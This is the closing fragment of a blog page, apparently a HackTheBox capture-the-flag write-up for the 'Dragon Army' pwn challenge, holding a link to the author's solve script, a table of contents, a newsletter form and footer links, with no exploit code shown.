+</code></pre></div><p>The full exploit script can be found in here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Dragon%20Army/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#understanding-the-arena">Understanding the arena</a></li></ul></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
